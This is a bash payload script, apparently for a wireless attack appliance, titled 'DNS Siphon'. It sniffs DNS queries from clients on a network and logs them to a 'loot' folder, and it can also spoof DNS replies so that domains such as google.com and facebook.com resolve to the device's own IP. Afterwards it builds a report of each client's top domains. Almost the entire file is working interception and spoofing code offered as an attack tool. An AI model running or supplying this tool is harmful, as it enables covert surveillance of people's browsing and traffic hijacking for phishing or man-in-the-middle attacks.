#!/bin/bash
# Title: DNS Siphon
# Author: NullSec
# Description: DNS query interception and browsing pattern analysis
# Category: nullsec/interception

LOOT_DIR="/mmc/nullsec/dnssiphon"
mkdir -p "$LOOT_DIR"

PROMPT "DNS SIPHON

Intercept and log all
DNS queries from clients.

Reveals browsing patterns,
app usage, and domain
access history.

Modes:
- Passive DNS logging
- Domain redirection
- Query statistics

Press OK to configure."

# Find interface
IFACE=""
for i in br-lan eth0 wlan1 wlan0; do
    [ -d "/sys/class/net/$i" ] && IFACE=$i && break
done
[ -z "$IFACE" ] && { ERROR_DIALOG "No interface found!"; exit 1; }

LOCAL_IP=$(ip addr show "$IFACE" | grep "inet " | awk '{print $2}' | cut -d'/' -f1)

PROMPT "SIPHON MODE:

1. Passive DNS logging
2. Log + redirect domains
3. Log + block domains
4. Full query analysis

Interface: $IFACE

Select mode next."

SIPHON_MODE=$(NUMBER_PICKER "Mode (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SIPHON_MODE=1 ;; esac

REDIRECT_DOMAINS=""
BLOCK_DOMAINS=""
if [ "$SIPHON_MODE" -eq 2 ]; then
    REDIRECT_DOMAINS=$(TEXT_PICKER "Redirect domains:" "google.com facebook.com")
    REDIRECT_IP=$(TEXT_PICKER "Redirect to IP:" "$LOCAL_IP")
fi

if [ "$SIPHON_MODE" -eq 3 ]; then
    BLOCK_DOMAINS=$(TEXT_PICKER "Block domains:" "ads.google.com tracking.com")
fi

DURATION=$(NUMBER_PICKER "Duration (minutes):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac

resp=$(CONFIRMATION_DIALOG "START DNS SIPHON?

Mode: $SIPHON_MODE
Interface: $IFACE
Duration: ${DURATION}m

All DNS queries will
be logged.

Confirm?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
DNS_LOG="$LOOT_DIR/dns_queries_$TIMESTAMP.log"
STATS_FILE="$LOOT_DIR/dns_stats_$TIMESTAMP.txt"

LOG "Starting DNS Siphon..."
SPINNER_START "Setting up DNS capture..."

# Build dnsmasq config for redirection/blocking
if [ "$SIPHON_MODE" -ge 2 ]; then
    killall dnsmasq 2>/dev/null
    sleep 1

    DNSMASQ_CONF="/tmp/dnssiphon.conf"
    cat > "$DNSMASQ_CONF" << EOF
interface=$IFACE
bind-interfaces
log-queries
log-facility=$DNS_LOG
server=8.8.8.8
server=8.8.4.4
EOF

    # Add redirects
    for DOMAIN in $REDIRECT_DOMAINS; do
        echo "address=/${DOMAIN}/${REDIRECT_IP}" >> "$DNSMASQ_CONF"
    done

    # Add blocks (redirect to 0.0.0.0)
    for DOMAIN in $BLOCK_DOMAINS; do
        echo "address=/${DOMAIN}/0.0.0.0" >> "$DNSMASQ_CONF"
    done

    dnsmasq -C "$DNSMASQ_CONF" &
    DNSMASQ_PID=$!
else
    # Passive: just capture DNS packets with tcpdump
    timeout $((DURATION * 60)) tcpdump -i "$IFACE" -nn -l 'udp port 53' 2>/dev/null | \
        while IFS= read -r line; do
            echo "$(date '+%H:%M:%S') $line" >> "$DNS_LOG"
        done &
    CAP_PID=$!
fi

SPINNER_STOP

PROMPT "DNS SIPHON ACTIVE!

Mode: $SIPHON_MODE
Logging to:
$DNS_LOG

Queries are being
captured in real time.

Press OK when done
or wait ${DURATION}m."

if [ -n "$DNSMASQ_PID" ]; then
    sleep $((DURATION * 60))
    kill $DNSMASQ_PID 2>/dev/null
    rm -f "$DNSMASQ_CONF"
else
    wait $CAP_PID 2>/dev/null
fi

# Generate statistics
echo "=======================================" > "$STATS_FILE"
echo "      DNS SIPHON ANALYSIS REPORT       " >> "$STATS_FILE"
echo "=======================================" >> "$STATS_FILE"
echo "" >> "$STATS_FILE"
echo "Scan Time: $(date)" >> "$STATS_FILE"
echo "Duration: ${DURATION} minutes" >> "$STATS_FILE"
echo "Interface: $IFACE" >> "$STATS_FILE"
echo "" >> "$STATS_FILE"

QUERY_COUNT=$(wc -l < "$DNS_LOG" 2>/dev/null | tr -d ' ')
echo "Total Queries: $QUERY_COUNT" >> "$STATS_FILE"
echo "" >> "$STATS_FILE"

echo "--- TOP 20 DOMAINS ---" >> "$STATS_FILE"
grep -oE "[a-zA-Z0-9.-]+\.(com|net|org|io|co|info|edu|gov)" "$DNS_LOG" 2>/dev/null | \
    sort | uniq -c | sort -rn | head -20 >> "$STATS_FILE"

echo "" >> "$STATS_FILE"
echo "--- UNIQUE CLIENTS ---" >> "$STATS_FILE"
grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" "$DNS_LOG" 2>/dev/null | \
    sort -u >> "$STATS_FILE"

echo "" >> "$STATS_FILE"
echo "--- QUERY TYPES ---" >> "$STATS_FILE"
grep -oE "\b(A|AAAA|MX|TXT|CNAME|PTR|SRV|SOA)\b" "$DNS_LOG" 2>/dev/null | \
    sort | uniq -c | sort -rn >> "$STATS_FILE"

UNIQUE_DOMAINS=$(grep -oE "[a-zA-Z0-9.-]+\.(com|net|org|io|co)" "$DNS_LOG" 2>/dev/null | sort -u | wc -l | tr -d ' ')

PROMPT "DNS SIPHON COMPLETE

Total queries: $QUERY_COUNT
Unique domains: $UNIQUE_DOMAINS
$([ -n "$REDIRECT_DOMAINS" ] && echo "Redirected: $REDIRECT_DOMAINS")
$([ -n "$BLOCK_DOMAINS" ] && echo "Blocked: $BLOCK_DOMAINS")

Reports saved to:
$LOOT_DIR/

Press OK to exit."
